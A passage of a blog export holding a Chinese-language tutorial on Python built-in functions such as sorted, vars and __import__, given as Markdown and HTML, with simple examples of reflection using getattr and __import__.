len() #返回对象（字符、列表、元组等）长度或项目个数。\n\n------\n\n##### memoryview() # 返回给定参数的内存查看对象(Momory view)。\n\n##### range() 函数可创建一个整数列表，一般用在 for 循环中。\n\n```python\nrange(start, stop[, step])\n```\n\n##### reversed() #返回一个反转的迭代器。\n\n##### round() #方法返回浮点数x的四舍五入值。\n\n##### sorted() 函数对所有可迭代的对象进行排序操作。\n\n- sort 与 sorted 区别：\n\n> sort 是应用在 list 上的方法，sorted 可以对所有可迭代的对象进行排序操作。\n>\n> sort是原处修改，sorted是产生新对象。\n\n```python\n# 按value进行排序\nsorted（dict.items(),key=lambda x:x[1]）\n```\n\n##### vars() #函数返回对象object的属性和属性值的字典对象。\n\n##### \\_\\_import__()  #用于动态导入模块 。 \n\n- 即可以以字符串类型的模块名导入模块。\n\n```\nimport os <==> __import__('os')\n```\n\n###### 反射\n\n```python\n1.反射：利用字符串的形式去对象中操作（获取，查询，设置，删除）属性.\n\tgetattr(module,attr)：到module对象（可以是模块等）查询attr属性并返回（可以是函数等）。\n\thasattr(module,attr)：判断module对象是否有attr属性，有返回True,没有false。\n\tsetattr(module,attr)：到module对象设置属性（导入模块会存在内存中，只会影响内存中的模块。）\n\tdelattr(module,attr)：删除module对象的attr属性（在内存中而不会影响原模块 ）。\n\n2.例子：例如通过反射实现用户输入URL自动跳转到相应页面。\n\timport modul\n\tdef f1():\n    \tuser_input = input('please input url:')\n    \tif hasattr(modul,user_input):\n        \tfun=getattr(modul,user_input)#返回函数体（函数名），而不是执行结果\n        \tfun()\n    \telse:\n        \tprint('not found')\n\tf1()\n\n\n#当需要的属性处于不同对象（模块）时，需要导入很多模块，不现实\n#可以通过根据用户输入的判断导入哪个模块及其属性\n#用户输入类型为str,但import module  ！=  import ’module‘\n#但mod=__import__('mudule')等价于import module as mod\n#提供了通过字符串导入模块的功能\n\tuser_input=input('please input url(xx/xx):')#输入格式为【模块名/属性】\n\tdef f2():\n    \tmod_name,attr_name=user_input.split('/')\n    \tmodu=__import__(mod_name) #引入模块命名为modu\n    \tif hasattr(modu,attr_name):\n        \tfun=getattr(modu,attr_name)\n        \tfun()\n    \telse:\n        \tprint(404)\n\tf2()\n\n#若要导入模块不在当前目录下，而是某目录下（如abc目录下）\n#__import__（'abc.module'）导入只会到abc，而不会到module\n#__import__（'abc.module'，fromlist=True）加了该参数便可以\n```\n\n","slug":"08python基础学习系列之内置函数","published":1,"updated":"2019-03-29T08:03:35.789Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjuam83k9001b7or0jxervl7x","content":"<h3 id=\"A\"><a href=\"#A\" class=\"headerlink\" title=\"A\"></a>A</h3><h4 id=\"abs-绝对值\"><a href=\"#abs-绝对值\" class=\"headerlink\" title=\"abs() #绝对值\"></a>abs() #绝对值</h4><h5 id=\"all-序列的元素全真为真-负数也算真\"><a href=\"#all-序列的元素全真为真-负数也算真\" class=\"headerlink\" title=\"all() #序列的元素全真为真(负数也算真)\"></a>all() #序列的元素全真为真(负数也算真)</h5><h5 id=\"any-序列的元素任一为真则真\"><a href=\"#any-序列的元素任一为真则真\" class=\"headerlink\" title=\"any() #序列的元素任一为真则真\"></a>any() #序列的元素任一为真则真</h5><h5 id=\"max-方法返回给定参数的最大值，参数可以为序列。\"><a href=\"#max-方法返回给定参数的最大值，参数可以为序列。\" class=\"headerlink\" title=\"max() #方法返回给定参数的最大值，参数可以为序列。\"></a>max() #方法返回给定参数的最大值，参数可以为序列。</h5><h5 id=\"min-方法返回给定参数的最小值，参数可以为序列。\"><a href=\"#min-方法返回给定参数的最小值，参数可以为序列。\" class=\"headerlink\" title=\"min() #方法返回给定参数的最小值，参数可以为序列。\"></a>min() #方法返回给定参数的最小值，参数可以为序列。</h5><h5 id=\"pow-方法返回-xy（x的y次方）-的值。\"><a href=\"#pow-方法返回-xy（x的y次方）-的值。\" class=\"headerlink\" title=\"pow() #方法返回 xy（x的y次方） 的值。\"></a>pow() #方法返回 xy（x的y次方） 的值。</h5><h5 id=\"sum-对可迭代对象求和。\"><a href=\"#sum-对可迭代对象求和。\" class=\"headerlink\" title=\"sum() #对可迭代对象求和。\"></a>sum() #对可迭代对象求和。</h5><h5 id=\"divmod-a-b-给定被除数和除数，返回商和余数在元组中。\"><a href=\"#divmod-a-b-给定被除数和除数，返回商和余数在元组中。\" class=\"headerlink\" title=\"divmod(a, b) #给定被除数和除数，返回商和余数在元组中。\"></a>divmod(a, b) #给定被除数和除数，返回商和余数在元组中。</h5><a id=\"more\"></a>\n<hr>\n<h5 id=\"ascii-类似-repr-函数-返回一个表示对象的字符串\"><a href=\"#ascii-类似-repr-函数-返回一个表示对象的字符串\" class=\"headerlink\" title=\"ascii() #类似 repr() 函数,返回一个表示对象的字符串\"></a>ascii() #类似 repr() 函数,返回一个表示对象的字符串</h5><hr>\n<h5 id=\"bin-返回十进制数的二进制\"><a href=\"#bin-返回十进制数的二进制\" class=\"headerlink\" title=\"bin() #返回十进制数的二进制\"></a>bin() #返回十进制数的二进制</h5><h5 id=\"oct-函数将一个整数转换成8进制字符串。\"><a href=\"#oct-函数将一个整数转换成8进制字符串。\" class=\"headerlink\" title=\"oct() #函数将一个整数转换成8进制字符串。\"></a>oct() #函数将一个整数转换成8进制字符串。</h5><h5 id=\"hex-函数用于将10进制整数转换成16进制整数。\"><a href=\"#hex-函数用于将10进制整数转换成16进制整数。\" class=\"headerlink\" title=\"hex() #函数用于将10进制整数转换成16进制整数。\"></a>hex() #函数用于将10进制整数转换成16进制整数。</h5><hr>\n<h3 id=\"B\"><a href=\"#B\" class=\"headerlink\" title=\"B\"></a>B</h3><h5 id=\"bool-返回给定对象的布尔值\"><a href=\"#bool-返回给定对象的布尔值\" class=\"headerlink\" title=\"bool() #返回给定对象的布尔值\"></a>bool() #返回给定对象的布尔值</h5><h5 id=\"bytearray-返回一个新字节数组。数组里的元素是可变的\"><a href=\"#bytearray-返回一个新字节数组。数组里的元素是可变的\" class=\"headerlink\" title=\"bytearray() #返回一个新字节数组。数组里的元素是可变的\"></a>bytearray() #返回一个新字节数组。数组里的元素是可变的</h5><h5 id=\"callable-检查一个对象是否是可调用的。\"><a href=\"#callable-检查一个对象是否是可调用的。\" class=\"headerlink\" title=\"callable() #检查一个对象是否是可调用的。\"></a>callable() #检查一个对象是否是可调用的。</h5><blockquote>\n<p>对于函数, 方法, lambda 函式, 类, 以及实现了<code>__call__</code> 方法的类实例, 它都返回 True。</p>\n</blockquote>\n<hr>\n<h5 id=\"chr-返回值是当前整数对应的ascii字符。\"><a href=\"#chr-返回值是当前整数对应的ascii字符。\" class=\"headerlink\" title=\"chr() # 返回值是当前整数对应的ascii字符。\"></a>chr() # 返回值是当前整数对应的ascii字符。</h5><h5 id=\"ord-返回字符对应的十进制整数。\"><a href=\"#ord-返回字符对应的十进制整数。\" class=\"headerlink\" title=\"ord() # 返回字符对应的十进制整数。\"></a>ord() # 返回字符对应的十进制整数。</h5><hr>\n<h5 id=\"compile-将一个字符串编译为字节代码。\"><a href=\"#compile-将一个字符串编译为字节代码。\" class=\"headerlink\" title=\"compile() #将一个字符串编译为字节代码。\"></a>compile() #将一个字符串编译为字节代码。</h5><hr>\n<h5 id=\"eval-执行一个字符串表达式，并返回表达式的值。\"><a href=\"#eval-执行一个字符串表达式，并返回表达式的值。\" class=\"headerlink\" title=\"eval() #执行一个字符串表达式，并返回表达式的值。\"></a>eval() #执行一个字符串表达式，并返回表达式的值。</h5><h5 id=\"exec-执行储存在字符串或文件中的-Python-语句。\"><a href=\"#exec-执行储存在字符串或文件中的-Python-语句。\" class=\"headerlink\" title=\"exec() #执行储存在字符串或文件中的 Python 语句。\"></a>exec() #执行储存在字符串或文件中的 Python 语句。</h5><ul>\n<li>相比于 eval，exec可以执行更复杂的 Python 代码。</li>\n<li>exec 返回值永远为 None。</li>\n</ul>\n<hr>\n<h5 id=\"frozenset-返回一个冻结的集合，冻结后集合不能再添加或删除任何元素。\"><a href=\"#frozenset-返回一个冻结的集合，冻结后集合不能再添加或删除任何元素。\" class=\"headerlink\" title=\"frozenset() #返回一个冻结的集合，冻结后集合不能再添加或删除任何元素。\"></a>frozenset() #返回一个冻结的集合，冻结后集合不能再添加或删除任何元素。</h5><hr>\n<h5 id=\"enumerate\"><a href=\"#enumerate\" class=\"headerlink\" title=\"enumerate()\"></a>enumerate()</h5><ul>\n<li>给定一个可迭代对象返回一个迭代器。迭代器每次可返回可迭代对象的元素及其元素对应的下标在一个元组中。</li>\n</ul>\n<h5 id=\"filter-函数用于过滤序列，过滤掉不符合条件的元素，返回由符合条件元素组成的迭代器。\"><a href=\"#filter-函数用于过滤序列，过滤掉不符合条件的元素，返回由符合条件元素组成的迭代器。\" class=\"headerlink\" title=\"filter() #函数用于过滤序列，过滤掉不符合条件的元素，返回由符合条件元素组成的迭代器。\"></a>filter() #函数用于过滤序列，过滤掉不符合条件的元素，返回由符合条件元素组成的迭代器。</h5><ul>\n<li>迭代序列，将每次迭代结果作为参数传入函数中。</li>\n<li>返回一个迭代器。</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> filter(<span class=\"keyword\">lambda</span> x:x&gt;<span class=\"number\">5</span>,range(<span class=\"number\">10</span>))</span><br><span class=\"line\"><span class=\"comment\"># 返回 6,7,8,9</span></span><br></pre></td></tr></table></figure>\n<h5 id=\"map-迭代序列的每个结果作为参数传入函数中，执行函数的返回值放入一个迭代器。\"><a href=\"#map-迭代序列的每个结果作为参数传入函数中，执行函数的返回值放入一个迭代器。\" class=\"headerlink\" title=\"map() #迭代序列的每个结果作为参数传入函数中，执行函数的返回值放入一个迭代器。\"></a>map() #迭代序列的每个结果作为参数传入函数中，执行函数的返回值放入一个迭代器。</h5><ul>\n<li>返回一个迭代器。</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a = map(<span class=\"keyword\">lambda</span> x:<span class=\"number\">8</span> <span class=\"keyword\">if</span> x&gt;<span class=\"number\">2</span> <span class=\"keyword\">else</span> x,range(<span class=\"number\">4</span>))</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> a:</span><br><span class=\"line\">    print(i) <span class=\"comment\">#返回0，1，2，8</span></span><br></pre></td></tr></table></figure>\n<h5 id=\"zip-分别迭代序列，并将每次结果先放入一个元组，最终放入迭代器。\"><a href=\"#zip-分别迭代序列，并将每次结果先放入一个元组，最终放入迭代器。\" class=\"headerlink\" title=\"zip() #分别迭代序列，并将每次结果先放入一个元组，最终放入迭代器。\"></a>zip() #分别迭代序列，并将每次结果先放入一个元组，最终放入迭代器。</h5><ul>\n<li>返回一个迭代器。</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a = [<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>]</span><br><span class=\"line\">b = [<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>]</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> zip(a,b) <span class=\"comment\">#返回(1, 4), (2, 5), (3, 6)</span></span><br></pre></td></tr></table></figure>\n<hr>\n<h5 id=\"globals-以字典类型返回当前位置的全部全局变量。\"><a href=\"#globals-以字典类型返回当前位置的全部全局变量。\" class=\"headerlink\" title=\"globals() #以字典类型返回当前位置的全部全局变量。\"></a>globals() #以字典类型返回当前位置的全部全局变量。</h5><h5 id=\"locals-函数会以字典类型返回当前位置的全部局部变量。\"><a href=\"#locals-函数会以字典类型返回当前位置的全部局部变量。\" class=\"headerlink\" title=\"locals() #函数会以字典类型返回当前位置的全部局部变量。\"></a>locals() #函数会以字典类型返回当前位置的全部局部变量。</h5><h5 id=\"hash-获取取一个对象（字符串或者数值等）的哈希值。\"><a href=\"#hash-获取取一个对象（字符串或者数值等）的哈希值。\" class=\"headerlink\" title=\"hash() #获取取一个对象（字符串或者数值等）的哈希值。\"></a>hash() #获取取一个对象（字符串或者数值等）的哈希值。</h5><hr>\n<h5 id=\"dir\"><a href=\"#dir\" class=\"headerlink\" title=\"dir()\"></a>dir()</h5><ul>\n<li>函数不带参数时，返回当前范围内的变量、方法和定义的类型列表；</li>\n<li>带参数时，返回参数的属性、方法列表。</li>\n</ul>\n<h5 id=\"id-函数用于获取对象的内存地址。\"><a href=\"#id-函数用于获取对象的内存地址。\" class=\"headerlink\" title=\"id() #函数用于获取对象的内存地址。\"></a>id() #函数用于获取对象的内存地址。</h5><ul>\n<li>== 判断字符是否对应相同，相同返回True</li>\n<li>is 判断内存地址是否相同，相同返回True</li>\n</ul>\n<h5 id=\"type-返回对象的类型。\"><a href=\"#type-返回对象的类型。\" class=\"headerlink\" title=\"type() #返回对象的类型。\"></a>type() #返回对象的类型。</h5><ul>\n<li>isinstance() 与 type() 区别：type() 不会认为子类是一种父类类型，不考虑继承关系。</li>\n</ul>\n<h5 id=\"isinstance-判断对象是否为另一对象的实例。\"><a href=\"#isinstance-判断对象是否为另一对象的实例。\" class=\"headerlink\" title=\"isinstance() #判断对象是否为另一对象的实例。\"></a>isinstance() #判断对象是否为另一对象的实例。</h5><ul>\n<li>isinstance() 与 type() 区别：isinstance() 会认为子类是一种父类类型，考虑继承关系。</li>\n</ul>\n<h5 id=\"issubclass-判断对象是否为另一对象的子类。\"><a href=\"#issubclass-判断对象是否为另一对象的子类。\" class=\"headerlink\" title=\"issubclass() #判断对象是否为另一对象的子类。\"></a>issubclass() #判断对象是否为另一对象的子类。</h5><h5 id=\"len-返回对象（字符、列表、元组等）长度或项目个数。\"><a href=\"#len-返回对象（字符、列表、元组等）长度或项目个数。\" class=\"headerlink\" title=\"len() #返回对象（字符、列表、元组等）长度或项目个数。\"></a>len() #返回对象（字符、列表、元组等）长度或项目个数。</h5><hr>\n<h5 id=\"memoryview-返回给定参数的内存查看对象-Momory-view-。\"><a href=\"#memoryview-返回给定参数的内存查看对象-Momory-view-。\" class=\"headerlink\" title=\"memoryview() # 返回给定参数的内存查看对象(Momory view)。\"></a>memoryview() # 返回给定参数的内存查看对象(Momory view)。</h5><h5 id=\"range-函数可创建一个整数列表，一般用在-for-循环中。\"><a href=\"#range-函数可创建一个整数列表，一般用在-for-循环中。\" class=\"headerlink\" title=\"range() 函数可创建一个整数列表，一般用在 for 循环中。\"></a>range() 函数可创建一个整数列表，一般用在 for 循环中。</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">range(start, stop[, step])</span><br></pre></td></tr></table></figure>\n<h5 id=\"reversed-返回一个反转的迭代器。\"><a href=\"#reversed-返回一个反转的迭代器。\" class=\"headerlink\" title=\"reversed() #返回一个反转的迭代器。\"></a>reversed() #返回一个反转的迭代器。</h5><h5 id=\"round-方法返回浮点数x的四舍五入值。\"><a href=\"#round-方法返回浮点数x的四舍五入值。\" class=\"headerlink\" title=\"round() #方法返回浮点数x的四舍五入值。\"></a>round() #方法返回浮点数x的四舍五入值。</h5><h5 id=\"sorted-函数对所有可迭代的对象进行排序操作。\"><a href=\"#sorted-函数对所有可迭代的对象进行排序操作。\" class=\"headerlink\" title=\"sorted() 函数对所有可迭代的对象进行排序操作。\"></a>sorted() 函数对所有可迭代的对象进行排序操作。</h5><ul>\n<li>sort 与 sorted 区别：</li>\n</ul>\n<blockquote>\n<p>sort 是应用在 list 上的方法，sorted 可以对所有可迭代的对象进行排序操作。</p>\n<p>sort是原处修改，sorted是产生新对象。</p>\n</blockquote>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 按value进行排序</span></span><br><span class=\"line\">sorted（dict.items(),key=<span class=\"keyword\">lambda</span> x:x[<span class=\"number\">1</span>]）</span><br></pre></td></tr></table></figure>\n<h5 id=\"vars-函数返回对象object的属性和属性值的字典对象。\"><a href=\"#vars-函数返回对象object的属性和属性值的字典对象。\" class=\"headerlink\" title=\"vars() #函数返回对象object的属性和属性值的字典对象。\"></a>vars() #函数返回对象object的属性和属性值的字典对象。</h5><h5 id=\"import-用于动态导入模块-。\"><a href=\"#import-用于动态导入模块-。\" class=\"headerlink\" title=\"__import__()  #用于动态导入模块 。\"></a>__import__()  #用于动态导入模块 。</h5><ul>\n<li>即可以以字符串类型的模块名导入模块。</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import os &lt;==&gt; __import__(&apos;os&apos;)</span><br></pre></td></tr></table></figure>\n<h6 id=\"反射\"><a href=\"#反射\" class=\"headerlink\" title=\"反射\"></a>反射</h6><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span>反射：利用字符串的形式去对象中操作（获取，查询，设置，删除）属性.</span><br><span class=\"line\">\tgetattr(module,attr)：到module对象（可以是模块等）查询attr属性并返回（可以是函数等）。</span><br><span class=\"line\">\thasattr(module,attr)：判断module对象是否有attr属性，有返回<span class=\"keyword\">True</span>,没有false。</span><br><span class=\"line\">\tsetattr(module,attr)：到module对象设置属性（导入模块会存在内存中，只会影响内存中的模块。）</span><br><span class=\"line\">\tdelattr(module,attr)：删除module对象的attr属性（在内存中而不会影响原模块 ）。</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">2.</span>例子：例如通过反射实现用户输入URL自动跳转到相应页面。</span><br><span class=\"line\">\t<span class=\"keyword\">import</span> modul</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">f1</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    \tuser_input = input(<span class=\"string\">'please input url:'</span>)</span><br><span class=\"line\">    \t<span class=\"keyword\">if</span> hasattr(modul,user_input):</span><br><span class=\"line\">        \tfun=getattr(modul,user_input)<span class=\"comment\">#返回函数体（函数名），而不是执行结果</span></span><br><span class=\"line\">        \tfun()</span><br><span class=\"line\">    \t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">        \tprint(<span class=\"string\">'not found'</span>)</span><br><span class=\"line\">\tf1()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#当需要的属性处于不同对象（模块）时，需要导入很多模块，不现实</span></span><br><span class=\"line\"><span class=\"comment\">#可以通过根据用户输入的判断导入哪个模块及其属性</span></span><br><span class=\"line\"><span class=\"comment\">#用户输入类型为str,但import module  ！=  import ’module‘</span></span><br><span class=\"line\"><span class=\"comment\">#但mod=__import__('mudule')等价于import module as mod</span></span><br><span class=\"line\"><span class=\"comment\">#提供了通过字符串导入模块的功能</span></span><br><span class=\"line\">\tuser_input=input(<span class=\"string\">'please input url(xx/xx):'</span>)<span class=\"comment\">#输入格式为【模块名/属性】</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">f2</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    \tmod_name,attr_name=user_input.split(<span class=\"string\">'/'</span>)</span><br><span class=\"line\">    \tmodu=__import__(mod_name) <span class=\"comment\">#引入模块命名为modu</span></span><br><span class=\"line\">    \t<span class=\"keyword\">if</span> hasattr(modu,attr_name):</span><br><span class=\"line\">        \tfun=getattr(modu,attr_name)</span><br><span class=\"line\">        \tfun()</span><br><span class=\"line\">    \t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">        \tprint(<span class=\"number\">404</span>)</span><br><span class=\"line\">\tf2()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#若要导入模块不在当前目录下，而是某目录下（如abc目录下）</span></span><br><span class=\"line\"><span class=\"comment\">#__import__（'abc.module'）导入只会到abc，而不会到module</span></span><br><span class=\"line\"><span class=\"comment\">#__import__（'abc.module'，fromlist=True）加了该参数便可以</span></span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"<h3 id=\"A\"><a href=\"#A\" class=\"headerlink\" title=\"A\"></a>A</h3><h4 id=\"abs-绝对值\"><a href=\"#abs-绝对值\" class=\"headerlink\" title=\"abs() #绝对值\"></a>abs() #绝对值</h4><h5 id=\"all-序列的元素全真为真-负数也算真\"><a href=\"#all-序列的元素全真为真-负数也算真\" class=\"headerlink\" title=\"all() #序列的元素全真为真(负数也算真)\"></a>all() #序列的元素全真为真(负数也算真)</h5><h5 id=\"any-序列的元素任一为真则真\"><a href=\"#any-序列的元素任一为真则真\" class=\"headerlink\" title=\"any() #序列的元素任一为真则真\"></a>any() #序列的元素任一为真则真</h5><h5 id=\"max-方法返回给定参数的最大值，参数可以为序列。\"><a href=\"#max-方法返回给定参数的最大值，参数可以为序列。\" class=\"headerlink\" title=\"max() #方法返回给定参数的最大值，参数可以为序列。\"></a>max() #方法返回给定参数的最大值，参数可以为序列。</h5><h5 id=\"min-方法返回给定参数的最小值，参数可以为序列。\"><a href=\"#min-方法返回给定参数的最小值，参数可以为序列。\" class=\"headerlink\" title=\"min() #方法返回给定参数的最小值，参数可以为序列。\"></a>min() #方法返回给定参数的最小值，参数可以为序列。</h5><h5 id=\"pow-方法返回-xy（x的y次方）-的值。\"><a href=\"#pow-方法返回-xy（x的y次方）-的值。\" class=\"headerlink\" title=\"pow() #方法返回 xy（x的y次方） 的值。\"></a>pow() #方法返回 xy（x的y次方） 的值。</h5><h5 id=\"sum-对可迭代对象求和。\"><a href=\"#sum-对可迭代对象求和。\" class=\"headerlink\" title=\"sum() #对可迭代对象求和。\"></a>sum() #对可迭代对象求和。</h5><h5 id=\"divmod-a-b-给定被除数和除数，返回商和余数在元组中。\"><a href=\"#divmod-a-b-给定被除数和除数，返回商和余数在元组中。\" class=\"headerlink\" title=\"divmod(a, b) #给定被除数和除数，返回商和余数在元组中。\"></a>divmod(a, b) #给定被除数和除数，返回商和余数在元组中。</h5>","more":"<hr>\n<h5 id=\"ascii-类似-repr-函数-返回一个表示对象的字符串\"><a href=\"#ascii-类似-repr-函数-返回一个表示对象的字符串\" class=\"headerlink\" title=\"ascii() #类似 repr() 函数,返回一个表示对象的字符串\"></a>ascii() #类似 repr() 函数,返回一个表示对象的字符串</h5><hr>\n<h5 id=\"bin-返回十进制数的二进制\"><a href=\"#bin-返回十进制数的二进制\" class=\"headerlink\" title=\"bin() #返回十进制数的二进制\"></a>bin() #返回十进制数的二进制</h5><h5 id=\"oct-函数将一个整数转换成8进制字符串。\"><a href=\"#oct-函数将一个整数转换成8进制字符串。\" class=\"headerlink\" title=\"oct() #函数将一个整数转换成8进制字符串。\"></a>oct() #函数将一个整数转换成8进制字符串。</h5><h5 id=\"hex-函数用于将10进制整数转换成16进制整数。\"><a href=\"#hex-函数用于将10进制整数转换成16进制整数。\" class=\"headerlink\" title=\"hex() #函数用于将10进制整数转换成16进制整数。\"></a>hex() #函数用于将10进制整数转换成16进制整数。</h5><hr>\n<h3 id=\"B\"><a href=\"#B\" class=\"headerlink\" title=\"B\"></a>B</h3><h5 id=\"bool-返回给定对象的布尔值\"><a href=\"#bool-返回给定对象的布尔值\" class=\"headerlink\" title=\"bool() #返回给定对象的布尔值\"></a>bool() #返回给定对象的布尔值</h5><h5 id=\"bytearray-返回一个新字节数组。数组里的元素是可变的\"><a href=\"#bytearray-返回一个新字节数组。数组里的元素是可变的\" class=\"headerlink\" title=\"bytearray() #返回一个新字节数组。数组里的元素是可变的\"></a>bytearray() #返回一个新字节数组。数组里的元素是可变的</h5><h5 id=\"callable-检查一个对象是否是可调用的。\"><a href=\"#callable-检查一个对象是否是可调用的。\" class=\"headerlink\" title=\"callable() #检查一个对象是否是可调用的。\"></a>callable() #检查一个对象是否是可调用的。</h5><blockquote>\n<p>对于函数, 方法, lambda 函式, 类, 以及实现了<code>__call__</code> 方法的类实例, 它都返回 True。</p>\n</blockquote>\n<hr>\n<h5 id=\"chr-返回值是当前整数对应的ascii字符。\"><a href=\"#chr-返回值是当前整数对应的ascii字符。\" class=\"headerlink\" title=\"chr() # 返回值是当前整数对应的ascii字符。\"></a>chr() # 返回值是当前整数对应的ascii字符。</h5><h5 id=\"ord-返回字符对应的十进制整数。\"><a href=\"#ord-返回字符对应的十进制整数。\" class=\"headerlink\" title=\"ord() # 返回字符对应的十进制整数。\"></a>ord() # 返回字符对应的十进制整数。</h5><hr>\n<h5 id=\"compile-将一个字符串编译为字节代码。\"><a href=\"#compile-将一个字符串编译为字节代码。\" class=\"headerlink\" title=\"compile() #将一个字符串编译为字节代码。\"></a>compile() #将一个字符串编译为字节代码。</h5><hr>\n<h5 id=\"eval-执行一个字符串表达式，并返回表达式的值。\"><a href=\"#eval-执行一个字符串表达式，并返回表达式的值。\" class=\"headerlink\" title=\"eval() #执行一个字符串表达式，并返回表达式的值。\"></a>eval() #执行一个字符串表达式，并返回表达式的值。</h5><h5 id=\"exec-执行储存在字符串或文件中的-Python-语句。\"><a href=\"#exec-执行储存在字符串或文件中的-Python-语句。\" class=\"headerlink\" title=\"exec() #执行储存在字符串或文件中的 Python 语句。\"></a>exec() #执行储存在字符串或文件中的 Python 语句。</h5><ul>\n<li>相比于 eval，exec可以执行更复杂的 Python 代码。</li>\n<li>exec 返回值永远为 None。</li>\n</ul>\n<hr>\n<h5 id=\"frozenset-返回一个冻结的集合，冻结后集合不能再添加或删除任何元素。\"><a href=\"#frozenset-返回一个冻结的集合，冻结后集合不能再添加或删除任何元素。\" class=\"headerlink\" title=\"frozenset() #返回一个冻结的集合，冻结后集合不能再添加或删除任何元素。\"></a>frozenset() #返回一个冻结的集合，冻结后集合不能再添加或删除任何元素。</h5><hr>\n<h5 id=\"enumerate\"><a href=\"#enumerate\" class=\"headerlink\" title=\"enumerate()\"></a>enumerate()</h5><ul>\n<li>给定一个可迭代对象返回一个迭代器。迭代器每次可返回可迭代对象的元素及其元素对应的下标在一个元组中。</li>\n</ul>\n<h5 id=\"filter-函数用于过滤序列，过滤掉不符合条件的元素，返回由符合条件元素组成的迭代器。\"><a href=\"#filter-函数用于过滤序列，过滤掉不符合条件的元素，返回由符合条件元素组成的迭代器。\" class=\"headerlink\" title=\"filter() #函数用于过滤序列，过滤掉不符合条件的元素，返回由符合条件元素组成的迭代器。\"></a>filter() #函数用于过滤序列，过滤掉不符合条件的元素，返回由符合条件元素组成的迭代器。</h5><ul>\n<li>迭代序列，将每次迭代结果作为参数传入函数中。</li>\n<li>返回一个迭代器。</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> filter(<span class=\"keyword\">lambda</span> x:x&gt;<span class=\"number\">5</span>,range(<span class=\"number\">10</span>))</span><br><span class=\"line\"><span class=\"comment\"># 返回 6,7,8,9</span></span><br></pre></td></tr></table></figure>\n<h5 id=\"map-迭代序列的每个结果作为参数传入函数中，执行函数的返回值放入一个迭代器。\"><a href=\"#map-迭代序列的每个结果作为参数传入函数中，执行函数的返回值放入一个迭代器。\" class=\"headerlink\" title=\"map() #迭代序列的每个结果作为参数传入函数中，执行函数的返回值放入一个迭代器。\"></a>map() #迭代序列的每个结果作为参数传入函数中，执行函数的返回值放入一个迭代器。</h5><ul>\n<li>返回一个迭代器。</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a = map(<span class=\"keyword\">lambda</span> x:<span class=\"number\">8</span> <span class=\"keyword\">if</span> x&gt;<span class=\"number\">2</span> <span class=\"keyword\">else</span> x,range(<span class=\"number\">4</span>))</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> a:</span><br><span class=\"line\">    print(i) <span class=\"comment\">#返回0，1，2，8</span></span><br></pre></td></tr></table></figure>\n<h5 id=\"zip-分别迭代序列，并将每次结果先放入一个元组，最终放入迭代器。\"><a href=\"#zip-分别迭代序列，并将每次结果先放入一个元组，最终放入迭代器。\" class=\"headerlink\" title=\"zip() 